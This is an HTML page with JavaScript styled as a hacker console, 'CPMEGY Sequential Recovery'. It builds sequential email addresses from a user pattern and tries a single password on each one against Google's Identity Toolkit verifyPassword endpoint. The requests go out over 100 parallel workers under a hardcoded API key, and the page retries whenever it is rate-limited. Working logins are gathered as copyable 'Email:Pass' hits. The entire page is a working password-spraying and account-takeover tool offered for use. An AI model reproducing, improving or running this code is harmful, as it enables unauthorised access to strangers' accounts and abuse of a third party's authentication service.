<!DOCTYPE html>
<html>
<head>
    <title>CPMEGY Sequential Pro</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background: #000; color: #00ffcc; font-family: 'Courier New', monospace; padding: 10px; text-align: center; }
        .bot-terminal { max-width: 550px; margin: auto; border: 2px solid #00ffcc; background: #050505; padding: 20px; box-shadow: 0 0 25px rgba(0,255,204,0.3); border-radius: 10px; }
        h1 { font-size: 18px; border-bottom: 1px solid #00ffcc; padding-bottom: 10px; margin-bottom: 20px; }
        
        input { width: 100%; padding: 14px; margin: 8px 0; background: #111; border: 1px solid #00ffcc; color: #fff; border-radius: 5px; outline: none; box-sizing: border-box; }
        .fire-btn { width: 100%; padding: 18px; background: #00ffcc; color: #000; border: none; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 10px; text-transform: uppercase; }
        
        .monitor { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 20px 0; background: #000; padding: 15px; border: 1px dashed #00ffcc; }
        .monitor b { font-size: 26px; color: #fff; display: block; }

        #log-box { height: 100px; width: 100%; background: #000; color: #00ffcc; font-size: 10px; text-align: left; padding: 8px; overflow-y: hidden; border: 1px solid #222; margin-bottom: 10px; line-height: 1.2; }
        #res-box { width: 100%; height: 230px; background: #000; color: #fff; border: 1px solid #00ffcc; padding: 10px; font-size: 13px; box-sizing: border-box; }
        
        .copy-btn { width: 100%; padding: 12px; background: #111; color: #00ffcc; border: 1px solid #00ffcc; margin-top: 10px; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>

<div class="bot-terminal">
    <h1>[ CPMEGY SEQUENTIAL RECOVERY ]</h1>
    
    <input type="text" id="fmt" placeholder="FORMAT: USER_{4}_@GMAIL.COM">
    <input type="text" id="pwd" placeholder="PASSWORD">
    
    <button class="fire-btn" id="ctrlBtn" onclick="ignite()">⚡ START SEQUENTIAL SCAN</button>

    <div class="monitor">
        <div>CHECKED<b id="c_val">0</b></div>
        <div>FOUND<b id="f_val">0</b></div>
    </div>

    <div id="log-box">Status: Ready to Ignite...</div>

    <textarea id="res-box" readonly placeholder="Hits: Email:Pass"></textarea>
    
    <button class="copy-btn" onclick="copyHits()">📋 COPY ALL EMAIL:PASS</button>
</div>

<script>
    let active = false;
    let checked = 0;
    let found = 0;
    let sharedIndex = 0;

    async function ignite() {
        if (active) { location.reload(); return; }
        
        let fmt = document.getElementById('fmt').value.toUpperCase().trim();
        let pwd = document.getElementById('pwd').value.trim();
        let key = "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ";

        if (!fmt.includes('{') || !pwd) return alert("Enter Format & Pass!");

        active = true;
        document.getElementById('ctrlBtn').innerText = "🛑 ABORT SYSTEM";
        document.getElementById('ctrlBtn').style.background = "#f00";
        document.getElementById('ctrlBtn').style.color = "#fff";
        
        let digits = fmt.match(/\{(\d+)\}/)[1];
        let max = Math.pow(10, digits);

        // --- EXTREME PARALLEL WORKERS (100+ Threads) ---
        let threads = 100; 

        for (let i = 0; i < threads; i++) {
            worker(fmt, pwd, key, digits, max);
        }
    }

    async function worker(fmt, pwd, key, digits, max) {
        while (active && sharedIndex < max) {
            let i = sharedIndex++; // അക്കൗണ്ട് നമ്പർ എടുക്കുന്നു
            let num = i.toString().padStart(digits, '0');
            let email = fmt.replace(/\{(\d+)\}/, num);
            
            writeLog(`SCANNING: ${num}`);

            let result = await checkAcc(email, pwd, key);

            if (result === "FAIL") {
                sharedIndex--; // വിട്ടുപോകാതിരിക്കാൻ ആ നമ്പർ തന്നെ റീ-ട്രൈ ചെയ്യുന്നു
                writeLog(`[!] RETRYING: ${num}`);
                await new Promise(r => setTimeout(r, 1000));
            } else {
                checked++;
                // കൃത്യമായ കൗണ്ട് കാണിക്കാൻ
                if (checked % 5 === 0) document.getElementById('c_val').innerText = checked;
            }
        }
    }

    async function checkAcc(em, pw, k) {
        try {
            let res = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${k}`, {
                method: 'POST',
                body: JSON.stringify({ email: em, password: pw, returnSecureToken: true }),
                headers: { 'Content-Type': 'application/json' }
            });
            
            // ഐപി ബ്ലോക്ക് ആയാലോ സർവർ എറർ വന്നാലോ FAIL റിട്ടേൺ ചെയ്യും
            if (res.status === 429 || res.status === 503) return "FAIL";

            let data = await res.json();
            if (data && data.idToken) {
                found++;
                document.getElementById('f_val').innerText = found;
                document.getElementById('res-box').value += em + ":" + pw + "\n";
                document.getElementById('res-box').scrollTop = document.getElementById('res-box').scrollHeight;
                writeLog(`[+] FOUND: ${em}`);
            }
            return "SUCCESS";
        } catch (e) {
            return "FAIL";
        }
    }

    function writeLog(msg) {
        let l = document.getElementById('log-box');
        l.innerHTML += `> ${msg}<br>`;
        l.scrollTop = l.scrollHeight;
        if (l.innerHTML.length > 1000) l.innerHTML = l.innerHTML.substring(500);
    }

    function copyHits() {
        let t = document.getElementById('res-box');
        t.select();
        document.execCommand('copy');
        alert("COPIED!");
    }
</script>

</body>
</html>
